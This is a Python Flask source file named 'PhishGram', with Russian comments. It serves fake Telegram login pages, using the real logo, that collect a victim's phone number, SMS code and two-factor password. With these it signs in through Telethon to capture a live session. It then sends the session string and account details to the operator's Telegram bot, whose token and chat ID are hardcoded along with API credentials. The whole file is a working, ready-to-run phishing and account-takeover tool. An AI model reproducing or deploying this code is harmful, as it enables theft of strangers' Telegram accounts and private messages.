import os
import re
import asyncio
import threading
import logging
from flask import Flask, render_template_string, request, session as flask_session
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeEmptyError
from telethon.sessions import StringSession
import requests

app = Flask(__name__)
app.secret_key = 'ph1shgram-s3cr3t-k3y'

# ТВОИ ДАННЫЕ (готово к запуску!)
API_ID = 37839268
API_HASH = '02f22349d03ee117dee396f65bcc56da'
BOT_TOKEN = '8791356428:AAGCZzEnZ5_4YxOMfajeZR4uJzZ9J81VSNg'
CHAT_ID = '7489815425'

# Хранилище состояний авторизации
auth_states = {}
loop = None

def init_async_loop():
    global loop
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

async def send_telegram(msg):
    """Отправка в твой Telegram"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": msg, "parse_mode": "HTML", "disable_web_page_preview": True}
    requests.post(url, data=data, timeout=10)

async def capture_session(phone, code, password=None):
    """Захват реальной сессии"""
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        
        if not await client.is_user_authorized():
            await client.send_code_request(phone)
            await client.sign_in(phone, code)
        
        if password and not await client.is_user_authorized():
            await client.sign_in(password=password)
        
        # Получаем сессию и инфу
        session_str = client.session.save()
        me = await client.get_me()
        
        info = f"""🎣 <b>НОВАЯ ТЕЛЕГРАМ СЕССИЯ!</b>

👤 <b>{me.first_name or ''} {me.last_name or ''}</b>
📱 <b>{phone}</b>
🆔 <b>{me.id}</b>
🔗 <b>Username: @{me.username or 'нет'}</b>

📋 <b>SESSION:</b>
<code>{session_str}</code>"""
        
        await send_telegram(info)
        await client.disconnect()
        return True
        
    except PhoneCodeInvalidError:
        await send_telegram(f"❌ Неверный код для <code>{phone}</code>\nКод: <code>{code}</code>")
    except SessionPasswordNeededError:
        await send_telegram(f"❌ Нужен пароль 2FA для <code>{phone}</code>\nКод: <code>{code}</code>")
    except Exception as e:
        await send_telegram(f"❌ Ошибка {phone}: <code>{str(e)}</code>")
    return False

def run_async(coro):
    """Запуск async в Flask"""
    global loop
    if loop is None:
        init_async_loop()
    return loop.run_until_complete(coro)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        phone = request.form.get('phone', '').strip()
        if re.match(r'^\+?\d{10,15}$', phone):
            phone = phone.replace('+', '').replace(' ', '').replace('-', '')
            sid = flask_session.get('sid', '0')
            auth_states[sid] = {'phone': f'+{phone}', 'step': 'code'}
            flask_session['sid'] = sid
            return code_page(phone)
    
    return render_template_string(HTML_INDEX)

@app.route('/code', methods=['GET', 'POST'])
def code_route():
    sid = flask_session.get('sid', '0')
    if sid not in auth_states:
        return index()
    
    phone = auth_states[sid]['phone']
    
    if request.method == 'POST':
        code = request.form.get('code', '').strip()
        if len(code) in [5, 6]:
            auth_states[sid]['code'] = code
            success = run_async(capture_session(phone, code))
            
            if success:
                del auth_states[sid]
                return success_page()
            else:
                return code_page(phone, error="Неверный код")
    
    return code_page(phone)

@app.route('/2fa', methods=['GET', 'POST'])
def twofa_route():
    sid = flask_session.get('sid', '0')
    if sid not in auth_states:
        return index()
    
    phone = auth_states[sid]['phone']
    code = auth_states[sid]['code']
    
    if request.method == 'POST':
        password = request.form.get('password', '')
        success = run_async(capture_session(phone, code, password))
        del auth_states[sid]
        return success_page()
    
    return twofa_page(phone)

# HTML ТЕМПЛЕЙТЫ
HTML_INDEX = """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<title>Telegram</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,sans-serif}
body{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.container{background:#fff;border-radius:20px;box-shadow:0 20px 40px rgba(0,0,0,.1);padding:40px;max-width:380px;width:100%}
.logo{text-align:center;margin-bottom:30px}
.logo img{width:70px;height:70px}
h1{color:#0066ff;font-size:24px;font-weight:600;margin-bottom:10px;text-align:center}
.subtitle{color:#666;text-align:center;margin-bottom:30px;font-size:14px}
input{width:100%;padding:15px;border:2px solid #e1e5e9;border-radius:12px;font-size:16px;transition:.3s;margin-bottom:20px}
input:focus{outline:none;border-color:#0066ff;box-shadow:0 0 0 3px rgba(0,102,255,.1)}
button{width:100%;padding:15px;background:#0066ff;color:#fff;border:none;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;transition:.3s}
button:hover{background:#0052cc;transform:translateY(-1px)}
.phone-box{background:#f8f9fa;padding:15px;border-radius:10px;text-align:center;font-weight:500;margin:20px 0;word-break:break-all}
.error{color:#e74c3c;font-size:14px;margin-bottom:15px;text-align:center}
.success{color:#27ae60;font-size:18px;text-align:center;margin:20px 0}
</style>
</head>
<body>
<div class="container">
<div class="logo"><img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram"></div>
<h1>Добро пожаловать в Telegram</h1>
<p class="subtitle">Введите номер телефона</p>
<form method="POST">
<input type="tel" name="phone" placeholder="+79991234567" required autocomplete="tel">
<button type="submit">Далее</button>
</form>
</div>
</body>
</html>
"""

def code_page(phone, error=None):
    html = f"""
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><title>Telegram - Код</title>
""" + CSS_BASE + """
</head>
<body>
<div class="container">
<div class="logo"><img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg"></div>
<h1>Код подтверждения</h1>
<p class="subtitle">Отправлен SMS на ваш номер</p>
<div class="phone-box">{phone}</div>
"""
    if error:
        html += f'<div class="error">{error}</div>'
    html += f"""
<form method="POST" action="/code">
<input type="text" name="code" placeholder="12345" maxlength="6" pattern="\\d{{5,6}}" required autocomplete="one-time-code">
<button type="submit">Подтвердить</button>
</form>
</div>
</body>
</html>
"""
    return html.format(phone=phone)

def twofa_page(phone):
    return f"""
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><title>Telegram - 2FA</title>
""" + CSS_BASE + """
</head>
<body>
<div class="container">
<div class="logo"><img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg"></div>
<h1>Двухфакторная защита</h1>
<p class="subtitle">Введите пароль 2FA</p>
<div class="phone-box">{phone}</div>
<form method="POST" action="/2fa">
<input type="password" name="password" placeholder="******" required>
<button type="submit">Войти</button>
</form>
</div>
</body>
</html>
""".format(phone=phone)

def success_page():
    return f"""
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><title>Telegram</title>
""" + CSS_BASE + """
</head>
<body>
<div class="container">
<div class="logo"><img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg"></div>
<div class="success">✅ Вход выполнен успешно!</div>
<p style="text-align:center;color:#666;margin:20px 0">Перенаправление через 3 секунды...</p>
<script>setTimeout(()=>location.href="/",3000)</script>
</div>
</body>
</html>
"""

CSS_BASE = """
<style>*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,sans-serif}
body{{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}}
.container{{background:#fff;border-radius:20px;box-shadow:0 20px 40px rgba(0,0,0,.1);padding:40px;max-width:380px;width:100%}}
.logo{{text-align:center;margin-bottom:30px}}
.logo img{{width:70px;height:70px}}
h1{{color:#0066ff;font-size:24px;font-weight:600;margin-bottom:10px;text-align:center}}
.subtitle{{color:#666;text-align:center;margin-bottom:30px;font-size:14px}}
input{{width:100%;padding:15px;border:2px solid #e1e5e9;border-radius:12px;font-size:16px;transition:.3s;margin-bottom:20px}}
input:focus{{outline:none;border-color:#0066ff;box-shadow:0 0 0 3px rgba(0,102,255,.1)}}
button{{width:100%;padding:15px;background:#0066ff;color:#fff;border:none;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;transition:.3s}}
button:hover{{background:#0052cc;transform:translateY(-1px)}}
.phone-box{{background:#f8f9fa;padding:15px;border-radius:10px;text-align:center;font-weight:500;margin:20px 0;word-break:break-all}}
.error{{color:#e74c3c;font-size:14px;margin-bottom:15px;text-align:center}}
.success{{color:#27ae60;font-size:18px;text-align:center;margin:20px 0}}
</style>
"""

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"🚀 PhishGram запущен на порту {port}")
    print(f"🌐 Ссылка: http://localhost:{port}")
    app.run(host='0.0.0.0', port=port, debug=False)
